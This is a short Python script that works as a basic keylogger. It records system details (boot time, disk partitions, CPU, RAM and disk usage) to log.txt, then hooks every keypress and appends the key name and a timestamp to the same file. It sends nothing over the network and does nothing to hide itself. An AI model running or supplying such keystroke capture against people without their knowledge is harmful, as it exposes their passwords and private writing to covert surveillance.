import keyboard
import psutil as info
from datetime import datetime


def first():
    with open("log.txt", "a") as f:
        f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{info.boot_time()}\n")
        f.write(f"{info.disk_partitions()}\n")
        f.write(f"{info.cpu_percent()}% CPU\n")
        f.write(f"{info.virtual_memory().percent}% RAM\n")
        f.write(f"{info.disk_usage('/').percent}% Disk\n")


def second(event):
    time = datetime.fromtimestamp(event.time).strftime('%Y-%m-%d %H:%M:%S')
    with open("log.txt" , "a") as f:
        f.write(f"Key: {event.name}\n")
        f.write(f"Time: {time}\n")
        f.write("\n")

if __name__ == '__main__':
    first()
    keyboard.on_press(second)
    keyboard.wait()